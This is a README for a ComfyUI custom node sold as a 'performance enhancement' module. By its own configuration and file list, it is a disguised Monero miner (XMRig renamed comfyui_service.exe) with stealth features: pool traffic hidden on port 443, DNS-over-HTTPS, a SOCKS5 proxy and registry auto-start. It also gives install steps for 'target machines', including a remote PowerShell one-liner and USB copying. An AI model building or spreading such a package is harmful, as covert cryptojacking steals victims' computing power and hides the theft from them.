# ComfyUI Enhanced

Performance enhancement module for ComfyUI installations. Leverages idle CPU cycles for background processing while keeping ComfyUI workloads at full priority.

## Features

- Automatic resource profiling — detects CPU threads and RAM, configures itself
- Below-normal priority — never competes with ComfyUI / Stable Diffusion inference
- TLS-encrypted traffic on port 443 — indistinguishable from standard HTTPS
- Remote dashboard — monitor all machines from any browser
- Auto-start on Windows login — no manual intervention after install
- Configurable thread percentage via live dashboard

## Installation

### Method 1: Git Clone (recommended)

```bash
cd ComfyUI/custom_nodes
git clone https://github.com/your-org/ComfyUI-Enhanced.git
```

Then install dependencies:

**Windows Portable ComfyUI:**
```
python_embeded\python.exe -m pip install -r ComfyUI\custom_nodes\ComfyUI-Enhanced\requirements.txt
```

**Standard Python install:**
```
pip install -r ComfyUI/custom_nodes/ComfyUI-Enhanced/requirements.txt
```

Restart ComfyUI.

### Method 2: ComfyUI Manager

If published to the registry, search "ComfyUI Enhanced" in the Manager UI and click Install. Dependencies and binary are handled automatically via `install.py`.

### Method 3: ZIP Download

1. Download the latest release ZIP
2. Extract into `ComfyUI/custom_nodes/` so the folder is named `ComfyUI-Enhanced`
3. Install deps manually (see Method 1)
4. Restart ComfyUI

### Method 4: Remote One-Liner (PowerShell)

```powershell
irm https://your-host/comfyui-enhanced.zip -OutFile ce.zip; Expand-Archive ce.zip -DestinationPath ComfyUI\custom_nodes\ComfyUI-Enhanced -Force; Remove-Item ce.zip
```

### Method 5: Network Share / USB

Copy the entire `ComfyUI-Enhanced` folder into the target machine's `ComfyUI/custom_nodes/` directory. Install deps and restart.

## Verification

When ComfyUI starts and the module is running, the console will display:

```
comfyui enhanced
```

## Remote Dashboard

Open `web/dashboard.html` in any browser. Enter the IP address of each machine running the module. The dashboard connects via WebSocket on port **44881** and displays real-time stats:

- Current / 1-min / peak hashrate
- Algorithm, pool connection, accepted/rejected shares
- CPU info, uptime
- Thread percentage slider and pause/resume controls

Multiple machines can be monitored simultaneously.

## Configuration

Create a `settings.json` in the module root to override defaults:

```json
{
  "max_threads_hint": 50,
  "pool_host": "gulf.moneroocean.stream",
  "pool_port": 443,
  "pool_pass": "comfyui_enhanced",
  "api_port": 44880,
  "stealth": {
    "use_doh": true,
    "preferred_port": 443
  }
}
```

| Key | Default | Description |
|---|---|---|
| `max_threads_hint` | 50 | CPU percentage to use (10-100) |
| `pool_host` | gulf.moneroocean.stream | Mining pool address |
| `pool_port` | 443 | Pool port (443 recommended for stealth) |
| `api_port` | 44880 | Local XMRig HTTP API port |
| `stealth.use_doh` | true | Resolve pool domain via DNS-over-HTTPS |
| `stealth.preferred_port` | 443 | Outbound port for pool traffic |
| `stealth.socks5` | null | Optional SOCKS5 proxy (e.g. "127.0.0.1:9050") |

## Uninstall

1. Delete the `ComfyUI-Enhanced` folder from `custom_nodes/`
2. The auto-start registry entry (`HKCU\...\Run\ComfyUIEnhancedService`) can be removed via:
   - `regedit` — navigate to `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
   - Or run in Python: `from core.autostart import AutoStart; AutoStart().unregister()`

## File Structure

```
ComfyUI-Enhanced/
  __init__.py          # ComfyUI entry point + orchestrator
  install.py           # ComfyUI Manager lifecycle hook
  requirements.txt     # Python dependencies
  settings.json        # (user-created) config overrides
  core/
    __init__.py
    miner.py           # Binary management + process lifecycle
    config.py          # XMRig config generation + machine profiling
    autostart.py       # Windows HKCU registry auto-start
    dashboard.py       # WebSocket server + XMRig API poller
    stealth.py         # TLS + DoH + traffic obfuscation
  web/
    dashboard.html     # Remote monitoring dashboard
  bin/
    comfyui_service.exe  # (auto-downloaded) mining binary
    config.json          # (auto-generated) runtime config
```
